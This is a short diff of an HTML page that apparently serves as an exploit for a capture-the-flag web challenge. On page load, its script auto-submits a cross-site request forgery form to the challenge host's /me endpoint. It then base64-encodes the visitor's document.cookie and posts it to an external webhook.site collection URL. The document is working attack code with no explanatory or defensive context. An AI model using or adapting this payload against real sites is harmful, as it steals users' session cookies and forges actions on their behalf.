@@ -7,12 +7,19 @@
 
 <body>
     <h1>Test</h1>
+
+    <form id="csfr" method="POST" action="https://zero-meme.edu-ctf.bookgin.tw:44303/me">
+    </form>
     <form id="f" method="POST" action="https://webhook.site/707d6503-5e96-49bd-97d9-5c3d5f8432ef">
-        <input type="text" id="ff" name="cookie" value=null>
-        <script>
-            document.getElementById("ff").value = btoa(document.cookie);
-            document.getElementById("f").submit();
-        </script>
+        <input type="text" id="ff" name="cookie" value=777>
+    </form>
+
+    <script>
+        document.getElementById("csfr").submit();
+        document.getElementById("ff").value = btoa(document.cookie);
+        document.getElementById("f").submit();
+    </script>
+
 </body>
 
 </html>
